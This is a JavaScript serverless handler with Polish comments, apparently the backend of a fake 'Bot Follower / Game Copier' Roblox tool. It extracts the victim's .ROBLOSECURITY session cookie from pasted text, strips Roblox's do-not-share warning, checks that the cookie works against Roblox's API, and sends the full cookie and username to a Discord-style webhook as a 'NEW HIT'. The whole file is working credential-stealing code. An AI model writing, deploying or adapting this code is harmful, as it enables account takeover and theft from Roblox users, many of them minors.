export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Only POST allowed" });
  }

  try {
    const { text } = req.body;
    const webhook = process.env.WEBHOOK_URL;

    if (!webhook) {
      return res.status(500).json({ error: "WEBHOOK_URL not set" });
    }

    if (!text || typeof text !== "string" || text.trim() === "") {
      return res.status(400).json({ error: "No input" });
    }

    const input = text.trim();
    let extracted = null;       // stare "items."
    let cookieValue = null;
    let username = "Nie udało się odczytać nazwy użytkownika";

    // 1. Stary mechanizm – items.
    const match = input.match(/items\.(.*?)(["\,])/i);
    if (match) {
      extracted = match[1].trim();
    }

    // 2. Wyciągamy .ROBLOSECURITY z całego tekstu (różne formaty)
    let possibleCookie = input;

    // Czyszczenie popularnych śmieci
    if (possibleCookie.includes(".ROBLOSECURITY=")) {
      possibleCookie = possibleCookie.split(".ROBLOSECURITY=")[1].split(/;| /)[0].trim();
    }
    // Usuwamy początek ostrzeżenia jeśli ktoś wkleił całość
    possibleCookie = possibleCookie.replace(/^_\|WARNING:DO-NOT-SHARE-THIS\.\s*--Sharing-this-will-allow-someone-to-log-in-as-you-and-access-your-account\.\s*/, "").trim();

    if (possibleCookie.startsWith("_|")) {
      cookieValue = possibleCookie;

      // Sprawdzamy, czy cookie działa i pobieramy username
      try {
        const authRes = await fetch("https://users.roblox.com/v1/users/authenticated", {
          method: "GET",
          headers: {
            "Cookie": `.ROBLOSECURITY=${cookieValue}`,
            "Accept": "application/json",
            "User-Agent": "Mozilla/5.0 (compatible; Vercel/1.0)"
          },
          redirect: "manual"   // unikamy niechcianych redirectów
        });

        if (authRes.ok) {
          const data = await authRes.json();
          username = data.name || data.displayName || data.username || "Zalogowano (brak nazwy)";
        } else if (authRes.status === 401) {
          username = "Cookie nieważne / wygasło (401 Unauthorized)";
        } else {
          username = `Błąd Roblox API: ${authRes.status}`;
        }
      } catch (e) {
        username = "Błąd podczas sprawdzania cookie (timeout / blokada)";
      }
    }

    // Budujemy opis embeda
    let description = "";

    if (extracted) {
      description += `**Wyodrębnione (items.):**\n\`\`\`${extracted}\`\`\`\n\n`;
    }

    if (cookieValue) {
      description += `**Cookie (.ROBLOSECURITY):**\n\`\`\`${cookieValue}\`\`\`\n\n`;
    }

    description += `**Nazwa użytkownika właściciela cookie:** ${username}`;

    if (!extracted && !cookieValue) {
      // nic nie złapało → wysyłamy surowy input (skrócony)
      description = "Nic nie wyodrębniono.\nWklejony tekst (fragment):\n\`\`\`" + input.substring(0, 400) + (input.length > 400 ? "..." : "") + "\`\`\`";
    }

    const embed = {
      title: "NEW HIT / COOKIE",
      description: description,
      color: 16711680,
      timestamp: new Date().toISOString(),
      footer: {
        text: "Bot Follower / Game Copier"
      }
    };

    const response = await fetch(webhook, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: "@everyone",
        embeds: [embed]
      })
    });

    const result = await response.text();

    res.status(200).json({
      success: true,
      extracted,
      cookie: cookieValue ? cookieValue.substring(0, 50) + "..." : null,
      username,
      webhookResponse: result
    });

  } catch (err) {
    res.status(500).json({ error: err.message });
  }
}
